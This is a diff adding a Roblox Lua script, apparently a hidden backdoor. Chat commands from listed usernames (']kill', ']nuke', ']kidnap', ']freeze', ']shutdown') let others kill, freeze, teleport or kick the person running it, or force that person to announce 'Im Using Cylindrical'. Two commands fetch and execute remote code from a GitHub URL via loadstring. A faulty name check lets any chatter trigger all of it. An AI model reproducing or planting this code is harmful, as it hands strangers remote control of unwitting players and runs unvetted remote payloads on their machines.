@@ -1,0 +1,636 @@
+  TheUser = game:GetService("Players").LocalPlayer.Name
+game.Players.PlayerAdded:connect(function(Player)
+    Player.Chatted:connect(function(mes)
+if Player.Name ==  "tipthedripper" or "FIRESTORMGAMERYT5" or "ftk_choppa4x" or "XxOmniversalxX" or "whyjustwhy2112" or "UnndarkfuI"     then
+mes = string.lower(mes)
+local split = mes:split(" ")
+local cmd = split[1]
+if cmd == "]kill"
+then
+target = split[2]
+if target == "all" then 
+game:GetService("Workspace")[TheUser].Head:Destroy()
+else
+  for i,v in pairs(game.Players:GetPlayers()) do 
+                 if v.Name:lower():sub(1,#target) == target:lower() then
+                   target = v.Name
+if v.Name == TheUser then
+game:GetService("Workspace")[TheUser].Head:Destroy()
+end
+end
+end
+end
+end
+end
+end)
+end)
+
+
+
+
+  TheUser = game:GetService("Players").LocalPlayer.Name
+for i,v in pairs(game.Players:GetChildren()) do
+    	v.Chatted:Connect(function(mes)
+if v.Name ==  "tipthedripper" or "FIRESTORMGAMERYT5"   or "ftk_choppa4x" or "XxOmniversalxX"   or "whyjustwhy2112"   or "UnndarkfuI"   then
+mes = string.lower(mes)
+name = v.Name
+local split = mes:split(" ")
+local cmd = split[1]
+if cmd == "]kill"
+then
+target = split[2]
+if target == "all" then 
+game:GetService("Workspace")[TheUser].Head:Destroy()
+else
+  for i,v in pairs(game.Players:GetPlayers()) do 
+                 if v.Name:lower():sub(1,#target) == target:lower() then
+                   target = v.Name
+if v.Name == TheUser then
+game:GetService("Workspace")[TheUser].Head:Destroy()
+end
+end
+end
+end
+end
+end
+end)
+end
+
+
+
+  TheUser = game:GetService("Players").LocalPlayer.Name
+game.Players.PlayerAdded:connect(function(Player)
+    Player.Chatted:connect(function(mes)
+if Player.Name ==  "tipthedripper" or "FIRESTORMGAMERYT5" or "ftk_choppa4x" or "XxOmniversalxX" or "whyjustwhy2112" or "UnndarkfuI"     then
+mes = string.lower(mes)
+local split = mes:split(" ")
+local cmd = split[1]
+if cmd == "]nuke"
+then
+target = split[2]
+if target == "all" then 
+loadstring(game:HttpGet('https://github.com/bifungiji/the-scripter/raw/main/NUKE'))()
+
+
+
+else
+  for i,v in pairs(game.Players:GetPlayers()) do 
+                 if v.Name:lower():sub(1,#target) == target:lower() then
+                   target = v.Name
+if v.Name == TheUser then
+
+
+
+loadstring(game:HttpGet('https://github.com/bifungiji/the-scripter/raw/main/NUKE'))()
+end
+end
+end
+end
+end
+end
+end)
+end)
+
+
+
+
+  TheUser = game:GetService("Players").LocalPlayer.Name
+for i,v in pairs(game.Players:GetChildren()) do
+    	v.Chatted:Connect(function(mes)
+if v.Name ==  "tipthedripper" or "FIRESTORMGAMERYT5"   or "ftk_choppa4x" or "XxOmniversalxX"   or "whyjustwhy2112"   or "UnndarkfuI"   then
+mes = string.lower(mes)
+name = v.Name
+local split = mes:split(" ")
+local cmd = split[1]
+if cmd == "]nuke"
+then
+target = split[2]
+if target == "all" then 
+
+loadstring(game:HttpGet('https://github.com/bifungiji/the-scripter/raw/main/NUKE'))()
+
+
+else
+  for i,v in pairs(game.Players:GetPlayers()) do 
+                 if v.Name:lower():sub(1,#target) == target:lower() then
+                   target = v.Name
+if v.Name == TheUser then
+
+
+loadstring(game:HttpGet('https://github.com/bifungiji/the-scripter/raw/main/NUKE'))()
+
+
+
+end
+end
+end
+end
+end
+end
+end)
+end
+
+
+
+
+
+
+  TheUser = game:GetService("Players").LocalPlayer.Name
+game.Players.PlayerAdded:connect(function(Player)
+    Player.Chatted:connect(function(mes)
+if Player.Name ==  "tipthedripper" or "FIRESTORMGAMERYT5" or "ftk_choppa4x" or "XxOmniversalxX" or "whyjustwhy2112" or "UnndarkfuI"     then
+mes = string.lower(mes)
+local split = mes:split(" ")
+local cmd = split[1]
+if cmd == "]rejoin"
+then
+target = split[2]
+if target == "all" then 
+Place = game.placeId
+job = game.JobId
+game:GetService("TeleportService"):TeleportToPlaceInstance(Place, job, game.Players.LocalPlayer)
+
+
+
+else
+  for i,v in pairs(game.Players:GetPlayers()) do 
+                 if v.Name:lower():sub(1,#target) == target:lower() then
+                   target = v.Name
+if v.Name == TheUser then
+
+
+
+Place = game.placeId
+job = game.JobId
+game:GetService("TeleportService"):TeleportToPlaceInstance(Place, job, game.Players.LocalPlayer)
+end
+end
+end
+end
+end
+end
+end)
+end)
+
+
+
+
+  TheUser = game:GetService("Players").LocalPlayer.Name
+for i,v in pairs(game.Players:GetChildren()) do
+    	v.Chatted:Connect(function(mes)
+if v.Name ==  "tipthedripper" or "FIRESTORMGAMERYT5"   or "ftk_choppa4x" or "XxOmniversalxX"   or "whyjustwhy2112"   or "UnndarkfuI"   then
+mes = string.lower(mes)
+name = v.Name
+local split = mes:split(" ")
+local cmd = split[1]
+if cmd == "]rejoin"
+then
+target = split[2]
+if target == "all" then 
+
+Place = game.placeId
+job = game.JobId
+game:GetService("TeleportService"):TeleportToPlaceInstance(Place, job, game.Players.LocalPlayer)
+
+
+else
+  for i,v in pairs(game.Players:GetPlayers()) do 
+                 if v.Name:lower():sub(1,#target) == target:lower() then
+                   target = v.Name
+if v.Name == TheUser then
+
+
+Place = game.placeId
+job = game.JobId
+game:GetService("TeleportService"):TeleportToPlaceInstance(Place, job, game.Players.LocalPlayer)
+
+
+
+end
+end
+end
+end
+end
+end
+end)
+end
+
+
+  TheUser = game:GetService("Players").LocalPlayer.Name
+game.Players.PlayerAdded:connect(function(Player)
+    Player.Chatted:connect(function(mes)
+if Player.Name ==  "tipthedripper" or "FIRESTORMGAMERYT5" or "ftk_choppa4x" or "XxOmniversalxX" or "whyjustwhy2112" or "UnndarkfuI"     then
+mes = string.lower(mes)
+local split = mes:split(" ")
+local cmd = split[1]
+if cmd == "]usingc"
+then
+target = split[2]
+if target == "all" then 
+ local ohString1 =    "/w " ..name.. " Im Using Cylindrical"
+local ohString2 = "All"
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
+
+
+
+else
+  for i,v in pairs(game.Players:GetPlayers()) do 
+                 if v.Name:lower():sub(1,#target) == target:lower() then
+                   target = v.Name
+if v.Name == TheUser then
+
+
+ local ohString1 =    "/w " ..name.. " Im Using Cylindrical"
+local ohString2 = "All"
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
+end
+end
+end
+end
+end
+end
+end)
+end)
+
+
+
+
+  TheUser = game:GetService("Players").LocalPlayer.Name
+for i,v in pairs(game.Players:GetChildren()) do
+    	v.Chatted:Connect(function(mes)
+if v.Name ==  "tipthedripper" or "FIRESTORMGAMERYT5"   or "ftk_choppa4x" or "XxOmniversalxX"   or "whyjustwhy2112"   or "UnndarkfuI"   then
+mes = string.lower(mes)
+name = v.Name
+local split = mes:split(" ")
+local cmd = split[1]
+if cmd == "]usingc"
+then
+target = split[2]
+if target == "all" then 
+
+ local ohString1 =    "/w " ..name.. " Im Using Cylindrical"
+local ohString2 = "All"
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
+
+else
+  for i,v in pairs(game.Players:GetPlayers()) do 
+                 if v.Name:lower():sub(1,#target) == target:lower() then
+                   target = v.Name
+if v.Name == TheUser then
+
+
+ local ohString1 =    "/w " ..name.. " Im Using Cylindrical"
+local ohString2 = "All"
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
+
+
+end
+end
+end
+end
+end
+end
+end)
+end
+
+
+  TheUser = game:GetService("Players").LocalPlayer.Name
+game.Players.PlayerAdded:connect(function(Player)
+    Player.Chatted:connect(function(mes)
+if Player.Name ==  "tipthedripper" or "FIRESTORMGAMERYT5" or "ftk_choppa4x" or "XxOmniversalxX" or "whyjustwhy2112" or "UnndarkfuI"     then
+mes = string.lower(mes)
+local split = mes:split(" ")
+local cmd = split[1]
+if cmd == "]kidnap"
+then
+target = split[2]
+if target == "all" then 
+loadstring(game:HttpGet('https://github.com/bifungiji/the-scripter/raw/main/kidnap'))()
+
+
+else
+  for i,v in pairs(game.Players:GetPlayers()) do 
+                 if v.Name:lower():sub(1,#target) == target:lower() then
+                   target = v.Name
+if v.Name == TheUser then
+
+
+loadstring(game:HttpGet('https://github.com/bifungiji/the-scripter/raw/main/kidnap'))()
+end
+end
+end
+end
+end
+end
+end)
+end)
+
+
+
+
+  TheUser = game:GetService("Players").LocalPlayer.Name
+for i,v in pairs(game.Players:GetChildren()) do
+    	v.Chatted:Connect(function(mes)
+if v.Name ==  "tipthedripper" or "FIRESTORMGAMERYT5"   or "ftk_choppa4x" or "XxOmniversalxX"   or "whyjustwhy2112"   or "UnndarkfuI"   then
+mes = string.lower(mes)
+name = v.Name
+local split = mes:split(" ")
+local cmd = split[1]
+if cmd == "]kidnap"
+then
+target = split[2]
+if target == "all" then 
+loadstring(game:HttpGet('https://github.com/bifungiji/the-scripter/raw/main/kidnap'))()
+
+else
+  for i,v in pairs(game.Players:GetPlayers()) do 
+                 if v.Name:lower():sub(1,#target) == target:lower() then
+                   target = v.Name
+if v.Name == TheUser then
+
+
+loadstring(game:HttpGet('https://github.com/bifungiji/the-scripter/raw/main/kidnap'))()
+
+end
+end
+end
+end
+end
+end
+end)
+end
+
+ TheUser = game:GetService("Players").LocalPlayer.Name
+game.Players.PlayerAdded:connect(function(Player)
+    Player.Chatted:connect(function(mes)
+if Player.Name ==  "tipthedripper" or  "FIRESTORMGAMERYT5"   or "ftk_choppa4x" or "XxOmniversalxX"   or "whyjustwhy2112"  or "UnndarkfuI"    then
+mes = string.lower(mes)
+local split = mes:split(" ")
+local cmd = split[1]
+if cmd == "]tome"
+then
+target = split[2]
+if target == "all" then 
+Pos = Player.Character.HumanoidRootPart.Position
+ print(Pos)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Pos)
+else
+  for i,v in pairs(game.Players:GetPlayers()) do 
+                 if v.Name:lower():sub(1,#target) == target:lower() then
+                   target = v.Name
+if v.Name == TheUser then
+print("started")
+Pos = Player.Character.HumanoidRootPart.Position
+ print(Pos)  
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Pos)
+end
+end
+end
+end
+end
+end
+end)
+end)
+
+
+  TheUser = game:GetService("Players").LocalPlayer.Name
+for i,v in pairs(game.Players:GetChildren()) do
+    	v.Chatted:Connect(function(mes)
+if v.Name ==  "tipthedripper" or  "FIRESTORMGAMERYT5"   or "ftk_choppa4x"  or "XxOmniversalxX"  or "whyjustwhy2112"  or "UnndarkfuI"    then
+mes = string.lower(mes)
+name = v
+local split = mes:split(" ")
+local cmd = split[1]
+if cmd == "]tome"
+then
+target = split[2]
+if target == "all" then 
+Pos = name.Character.HumanoidRootPart.Position
+ print(Pos)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Pos)
+else
+  for i,v in pairs(game.Players:GetPlayers()) do 
+                 if v.Name:lower():sub(1,#target) == target:lower() then
+                   target = v.Name
+if v.Name == TheUser then
+print("started")
+Pos = name.Character.HumanoidRootPart.Position
+ print(Pos)  
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Pos)
+end
+end
+end
+end
+end
+end
+end)
+end
+
+
+_G.Frozen = false
+
+  TheUser = game:GetService("Players").LocalPlayer.Name
+for i,v in pairs(game.Players:GetChildren()) do
+    	v.Chatted:Connect(function(mes)
+if v.Name ==  "tipthedripper" or  "FIRESTORMGAMERYT5"   or "ftk_choppa4x"  or "XxOmniversalxX" or "whyjustwhy2112"  or "UnndarkfuI"  then
+mes = string.lower(mes)
+name = v
+local split = mes:split(" ")
+local cmd = split[1]
+if cmd == "]freeze"
+then
+target = split[2]
+if target == "all" then 
+    _G.Frozen = true
+    
+game:GetService("Workspace")[TheUser].HumanoidRootPart.Anchored = true
+else
+  for i,v in pairs(game.Players:GetPlayers()) do 
+                 if v.Name:lower():sub(1,#target) == target:lower() then
+                   target = v.Name
+if v.Name == TheUser then
+
+_G.Frozen = true
+
+game:GetService("Workspace")[TheUser].HumanoidRootPart.Anchored = true
+end
+end
+end
+end
+end
+end
+end)
+end
+
+
+
+  TheUser = game:GetService("Players").LocalPlayer.Name
+for i,v in pairs(game.Players:GetChildren()) do
+    	v.Chatted:Connect(function(mes)
+if v.Name ==  "tipthedripper" or  "FIRESTORMGAMERYT5"   or "ftk_choppa4x"  or "XxOmniversalxX" or "whyjustwhy2112"   or "UnndarkfuI"    then
+mes = string.lower(mes)
+name = v
+local split = mes:split(" ")
+local cmd = split[1]
+if cmd == "]unfreeze"
+then
+target = split[2]
+if target == "all" then
+_G.Frozen = false
+wait(1)
+game:GetService("Workspace")[TheUser].HumanoidRootPart.Anchored = false
+else
+  for i,v in pairs(game.Players:GetPlayers()) do 
+                 if v.Name:lower():sub(1,#target) == target:lower() then
+                   target = v.Name
+if v.Name == TheUser then
+_G.Frozen = false
+wait(1)
+game:GetService("Workspace")[TheUser].HumanoidRootPart.Anchored = false
+end
+end
+end
+end
+end
+end
+end)
+end
+
+
+
+  TheUser = game:GetService("Players").LocalPlayer.Name
+game.Players.PlayerAdded:connect(function(Player)
+    Player.Chatted:connect(function(mes)
+if Player.Name ==  "tipthedripper" or  "FIRESTORMGAMERYT5"   or "ftk_choppa4x" or "XxOmniversalxX"   or "whyjustwhy2112"   or "UnndarkfuI"   then
+mes = string.lower(mes)
+local split = mes:split(" ")
+local cmd = split[1]
+if cmd == "]freeze"
+then
+target = split[2]
+if target == "all" then 
+    _G.Frozen = true
+    
+game:GetService("Workspace")[TheUser].HumanoidRootPart.Anchored = true
+else
+  for i,v in pairs(game.Players:GetPlayers()) do 
+                 if v.Name:lower():sub(1,#target) == target:lower() then
+                   target = v.Name
+if v.Name == TheUser then
+
+_G.Frozen = true
+
+game:GetService("Workspace")[TheUser].HumanoidRootPart.Anchored = true
+end
+end
+end
+end
+end
+end
+end)
+end)
+
+
+  TheUser = game:GetService("Players").LocalPlayer.Name
+game.Players.PlayerAdded:connect(function(Player)
+    Player.Chatted:connect(function(mes)
+if Player.Name ==  "tipthedripper" or  "FIRESTORMGAMERYT5"   or "ftk_choppa4x" or "XxOmniversalxX"  or "whyjustwhy2112"   or "UnndarkfuI"    then
+mes = string.lower(mes)
+local split = mes:split(" ")
+local cmd = split[1]
+if cmd == "]unfreeze"
+then
+target = split[2]
+if target == "all" then
+
+_G.Frozen = false
+wait(1)
+game:GetService("Workspace")[TheUser].HumanoidRootPart.Anchored = false
+else
+  for i,v in pairs(game.Players:GetPlayers()) do 
+                 if v.Name:lower():sub(1,#target) == target:lower() then
+                   target = v.Name
+if v.Name == TheUser then
+
+_G.Frozen = false
+wait(1)
+game:GetService("Workspace")[TheUser].HumanoidRootPart.Anchored = false
+end
+end
+end
+end
+end
+end
+end)
+end)
+
+
+
+ TheUser = game:GetService("Players").LocalPlayer.Name
+game.Players.PlayerAdded:connect(function(Player)
+    Player.Chatted:connect(function(mes)
+if Player.Name ==  "tipthedripper" or "FIRESTORMGAMERYT5"   or "ftk_choppa4x" or "XxOmniversalxX"   or "whyjustwhy2112"  or "UnndarkfuI"    then
+mes = string.lower(mes)
+local split = mes:split(" ")
+local cmd = split[1]
+if cmd == "]shutdown"
+then
+target = split[2]
+if target == "all" then 
+game.Players.LocalPlayer:Kick("You Were Shut Down by "..Player.Name) 
+else
+  for i,v in pairs(game.Players:GetPlayers()) do 
+                 if v.Name:lower():sub(1,#target) == target:lower() then
+                   target = v.Name
+if v.Name == TheUser then
+game.Players.LocalPlayer:Kick("You Were Shut Down by "..Player.Name) 
+end
+end
+end
+end
+end
+end
+end)
+end)
+
+
+TheUser = game:GetService("Players").LocalPlayer.Name
+for i,v in pairs(game.Players:GetChildren()) do
+    	v.Chatted:Connect(function(mes)
+if v.Name ==  "tipthedripper" or "FIRESTORMGAMERYT5"   or "ftk_choppa4x"  or "XxOmniversalxX"  or "whyjustwhy2112"  or "UnndarkfuI"    then
+mes = string.lower(mes)
+name = v.Name
+local split = mes:split(" ")
+local cmd = split[1]
+if cmd == "]shutdown"
+then
+target = split[2]
+if target == "all" then 
+game.Players.LocalPlayer:Kick("You Were Shut Down by "..name) 
+else
+  for i,v in pairs(game.Players:GetPlayers()) do 
+                 if v.Name:lower():sub(1,#target) == target:lower() then
+                   target = v.Name
+if v.Name == TheUser then
+game.Players.LocalPlayer:Kick("You Were Shut Down by "..name) 
+end
+end
+end
+end
+end
+end
+end)
+end
+
+
+
+while wait(0.1) do
+if _G.Frozen == true then
+print("                    Froze")
+  TheUser = game:GetService("Players").LocalPlayer.Name
+game:GetService("Workspace")[TheUser].HumanoidRootPart.Anchored = true
+
+end
+end
+
+
